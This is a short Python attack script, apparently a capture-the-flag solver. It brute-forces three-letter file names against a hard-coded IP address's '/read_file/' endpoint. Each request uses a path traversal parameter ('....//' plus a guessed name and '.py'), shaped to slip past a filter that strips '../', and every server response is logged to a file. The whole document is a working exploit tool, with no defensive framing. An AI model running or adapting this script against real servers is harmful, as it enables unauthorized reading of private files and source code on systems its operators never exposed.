#!/usr/bin/env python3.7

import requests

special_chars = ".#+*?\&/"
lower_chars = "abcdefghijklmnopqrstuvwxyz"
path_chars = "./"
chars = lower_chars

def fuzz(length):
    temp_list = []
    for i in range(len(chars)):
        temp_list.append(chars[i])
    if length == 1:
        return temp_list
    else:
        return fuzz_list(length - 1, temp_list)

def fuzz_list(length, listInput):
    temp_list = []
    for i in range(len(listInput)):
        for j in range(len(chars)):
            temp_list.append(listInput[i] + chars[j])
    if length == 1:
        return temp_list
    else:
        return fuzz_list(length - 1, temp_list)

if __name__ == '__main__':

    base_url = "http://66.172.33.148:8008/read_file/"
    for j in range(3, 4):
        fuzzed_list = fuzz(j)
        print(fuzzed_list)
        f = open("output.txt", "a")
        
        # for i in range(len(fuzzed_list)):
        #     params = "?file=public.txt" + fuzzed_list[i]
        #     url = base_url + params 

        #     f.write(params + "\n")
        #     response = requests.get(url)
        #     f.write(response.text + "\n")

        for i in range (len(fuzzed_list)):
            params = "?file=....//" + fuzzed_list[i] +  ".py" 
            url = base_url + params 

            f.write(params + "\n")
            response = requests.get(url)
            f.write(response.text + "\n")

        f.close()

